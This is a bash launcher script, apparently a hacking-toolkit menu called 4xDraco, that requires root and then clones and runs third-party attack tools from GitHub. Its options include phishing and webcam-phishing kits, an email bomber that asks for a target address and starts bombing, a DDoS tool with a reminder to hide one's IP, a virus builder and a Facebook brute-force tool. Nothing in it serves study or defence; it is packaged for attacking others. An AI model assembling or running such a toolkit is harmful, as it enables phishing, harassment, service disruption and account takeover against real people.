#!/bin/bash

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "Please run as root (use sudo)"
    exit
fi

clear
mkdir -p Tools
clear 
echo -e '\033[31;40;1m 
 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                     v4
  Coded by 4d1ty4x
  github: https://github.com/jhwach
\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m 4d1ty4x

\e[37m[1]\e[36m Requirements & Update        \e[37m[2]\e[36m Phishing Tool			
\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan		
\e[37m[5]\e[36m Gmail Bomber	          \e[37m[6]\e[36m DDOS Attack		
\e[37m[7]\e[36m How to Use?                  \e[37m[8]\e[36m Uninstall downloaded tools	
\e[37m[9]\e[36m IP Info	                  \e[37m[10]\e[36m dorks-eye
\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
\e[37m[15]\e[36m BadMod	                  \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER
'

# Option Selection
read -p "Enter your transaction number: " option

if [[ $option == 1 || $option == 01 ]]; then
    clear
    echo -e "\033[47;31;5m Installing updates and requirements...\033[0m"
    sleep 3
    apt update && apt upgrade -y
    pkg install git python python3 pip pip3 curl -y
    clear
    echo -e "\033[47;3;35m Update complete...\033[0m"
    sleep 2
    bash 4xDraco.sh

elif [[ $option == 2 || $option == 02 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/htr-tech/zphisher
    cd zphisher
    bash zphisher.sh

elif [[ $option == 3 || $option == 03 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/techchipnet/CamPhish
    cd CamPhish
    bash camphish.sh

elif [[ $option == 4 || $option == 04 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/zidansec/subscan
    cd subscan
    read -p "Enter a domain (e.g., example.com): " sc
    ./subscan $sc
       
elif [[ $option == 5 || $option == 05 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/juzeon/fast-mail-bomber.git
    cd fast-mail-bomber/
    mv config.example.php config.php
    php index.php update-providers
    rm -rf data/nodes.json data/dead_providers.json
    echo -e "\033[47;3;35m This installation will take time\033[0m"
    echo -e "\033[47;3;35m To stop, press Ctrl+C\033[0m"
    sleep 3
    php index.php update-nodes
    php index.php refine-nodes
    echo "-------------------------"
    read -p "Enter an email address to bomb: " mail
    echo "-------------------------"
    php index.php start-bombing $mail

elif [[ $option == 6 || $option == 06 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/palahsu/DDoS-Ripper.git
    cd DDoS-Ripper
    python3 DRipper.py
    echo ""
    echo -e "\033[47;3;35m Hide your IP before using\033[0m"

elif [[ $option == 7 || $option == 07 ]]; then
    clear
    echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
    python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
    sleep 5
    echo "Wait for 5 seconds"
    bash 4xDraco.sh

elif [[ $option == 8 || $option == 08 ]]; then
    clear
    echo -e "\033[47;3;35m REMOVING DOWNLOADED TOOLS...\033[0m"
    sleep 2
    rm -rf Tools
    echo -e "\033[47;3;35m Tools removed successfully!\033[0m"
    sleep 1
    bash 4xDraco.sh

elif [[ $option == 9 || $option == 09 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    apt update
    apt install git curl -y
    git clone https://github.com/htr-tech/track-ip.git
    cd track-ip
    bash trackip

elif [[ $option == 10 || $option == 010 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/BullsEye0/dorks-eye.git
    cd dorks-eye
    pip install -r requirements.txt
    python3 dorks-eye.py

elif [[ $option == 11 || $option == 011 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    apt update && apt upgrade -y
    apt install git python2 -y
    git clone https://github.com/jaykali/hackerpro.git
    cd hackerpro
    bash install.sh
    python2 hackerpro.py

elif [[ $option == 12 || $option == 012 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/Tuhinshubhra/RED_HAWK
    cd RED_HAWK
    php rhawk.php

elif [[ $option == 13 || $option == 013 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/Devil-Tigers/TigerVirus
    cd TigerVirus
    bash app.sh

elif [[ $option == 14 || $option == 014 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    apt install curl git -y
    git clone https://github.com/king-hacking/info-site.git
    cd info-site
    bash info.sh

elif [[ $option == 15 || $option == 015 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/RedVirus0/BadMod.git
    cd BadMod
    pip install -r requirements.txt
    python3 badmod.py

elif [[ $option == 16 || $option == 016 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/fu8uk1/Facebash.git
    cd Facebash
    bash facebash.sh

elif [[ $option == 17 || $option == 017 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/D4RK-4RMY/DARKARMY
    cd DARKARMY
    bash darkarmy.sh

elif [[ $option == 18 || $option == 018 ]]; then
    clear
    echo -e "\033[47;3;35m Installation might take some time\033[0m"
    sleep 2
    cd Tools
    git clone https://github.com/thelinuxchoice/autoipchanger.git
    cd autoipchanger
    bash autoipchanger.sh

else
    echo -e "\033[31mInvalid option! Please try again.\033[0m"
    sleep 2
    bash 4xDraco.sh
fi

# Add cleanup for Ctrl+C
trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\033[31m[*] Cleaning up and exiting...\033[0m"
    cd "$HOME"
    exit 1
}
